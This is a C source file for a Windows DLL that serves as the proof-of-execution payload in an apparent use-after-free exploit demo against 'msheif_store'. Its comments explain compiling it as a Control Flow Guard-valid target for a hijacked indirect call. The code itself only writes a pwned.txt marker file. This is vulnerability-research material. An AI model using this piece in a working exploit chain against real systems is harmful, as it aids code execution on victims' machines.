// beacon.c — proof-of-execution target for the msheif_store UAF demo.
//
// Compiled with /guard:cf so its function addresses are valid targets under
// the process CFG policy (the call site runs in powershell/explorer, both
// CFG-managed processes; the check is a process-wide dispatch).
//
// On execution, writes %USERPROFILE%\Desktop\pwned.txt — filesystem
// proof that the corrupted indirect call transferred execution here.
#include <windows.h>

__declspec(dllexport)
void __stdcall BeaconProc(void)
{
    char path[MAX_PATH];
    if (ExpandEnvironmentStringsA("%USERPROFILE%\\Desktop\\pwned.txt",
                                  path, sizeof(path)) == 0 ||
        path[0] == '\0') {
        return;
    }
    HANDLE f = CreateFileA(path,
                           GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                           FILE_ATTRIBUTE_NORMAL, NULL);
    if (f != INVALID_HANDLE_VALUE) {
        const char *msg =
            "CODE EXECUTION: msheif_store UAF -> controlled indirect call -> beacon\r\n";
        DWORD written = 0;
        WriteFile(f, msg, lstrlenA(msg), &written, NULL);
        CloseHandle(f);
    }
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID reserved)
{
    (void)h; (void)reason; (void)reserved;
    return TRUE;
}
